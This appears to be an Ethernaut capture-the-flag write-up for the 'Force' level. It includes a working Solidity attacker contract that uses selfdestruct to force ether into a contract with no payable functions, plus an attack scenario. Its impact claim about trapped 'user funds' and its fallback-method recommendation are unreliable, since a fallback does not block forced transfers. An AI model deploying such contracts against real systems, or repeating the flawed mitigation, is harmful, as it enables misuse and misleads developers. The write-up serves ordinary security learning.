#### Some contracts will simply not take your money ¯\_(ツ)_/¯. The goal of this level is to make the balance of the contract greater than zero.

Things that might help:
- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the "?" page above, section "Beyond the console"

## Summary
The `Force` contact can be forced to take funds inside. However, they will remain trapped forever in it. Because it does not have any methods.

```solidity
contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

## Vulnerability Detail
An attacker could deploy another contract and forcefully send funds to the `Force` contract. They will remain trapped inside.

The malicious contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address public forceAddress;

    constructor(address _forceAddress) {
        forceAddress = _forceAddress;
    }

    function forceSendMoney() public payable {
        selfdestruct(payable(forceAddress));
    }
}
```

Attack scenario:
1. Attacker deploys the malicious contract `ForceAttacker`.
2. They call the `forceSendMoney()` method with a `value = 1 ether`.
3. The attacker has successfully trapped `1 ether` inside the `Force` contract.

## Impact
High. An attacker can trap user funds forever inside the `Force` contract.

## Code Snippet
https://github.com/danielvichinyan/ethernaut-solutions/blob/main/force/Force.sol#L4-L10

## Tools Used
Remix IDE, Manual Review

## Recommendation
Provide fallback methods inside the `Force` contract to handle incoming funds efficiently.
